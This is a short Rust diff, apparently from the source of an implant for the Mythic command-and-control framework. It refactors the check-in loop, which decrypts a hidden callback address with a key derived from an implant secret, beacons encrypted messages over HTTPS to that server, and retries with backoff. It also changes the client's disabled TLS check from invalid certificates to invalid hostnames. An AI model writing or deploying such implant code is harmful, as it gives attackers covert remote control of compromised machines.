@@ -71,7 +71,7 @@ pub struct PostResponseMessage<'a> {
 
 pub fn build_client() -> reqwest::blocking::Client {
     reqwest::blocking::Client::builder()
-        .danger_accept_invalid_certs(true)
+        .danger_accept_invalid_hostnames(true)
         .build()
         .expect("reqwest client init failed")
 }
@@ -367,8 +367,8 @@ pub fn run_c2_loop<F>(
     F: Fn(&str, &str) -> String,
 {
     let encryption_key = derive_key(implant_secret.as_bytes(), "mythic-salt");
-    let decrypted_callback = decrypt_config(callback, &encryption_key)
-        .unwrap_or_else(|| callback.to_string());
+    let decrypted_callback =
+        decrypt_config(callback, &encryption_key).unwrap_or_else(|| callback.to_string());
 
     let client = build_client();
     let base = format!("https://{}", decrypted_callback);
@@ -401,25 +401,22 @@ pub fn run_c2_loop<F>(
         if should_exit() {
             return;
         }
-        match client
+        if let Ok(resp) = client
             .post(format!("{}{}", base, uri))
             .body(checkin_msg.clone())
             .header("Content-Type", "application/octet-stream")
             .send()
         {
-            Ok(resp) => {
-                if let Ok(raw) = resp.text() {
-                    if let Some(json) = parse_mythic_message(&raw, &encryption_key) {
-                        if let Ok(cr) = serde_json::from_str::<CheckinResponse>(&json) {
-                            if cr.status == "success" {
-                                callback_id = cr.id;
-                                break;
-                            }
+            if let Ok(raw) = resp.text() {
+                if let Some(json) = parse_mythic_message(&raw, &encryption_key) {
+                    if let Ok(cr) = serde_json::from_str::<CheckinResponse>(&json) {
+                        if cr.status == "success" {
+                            callback_id = cr.id;
+                            break;
                         }
                     }
                 }
             }
-            Err(_) => {}
         }
         sleep(retry_delay);
         retry_delay = (retry_delay * 2).min(60);
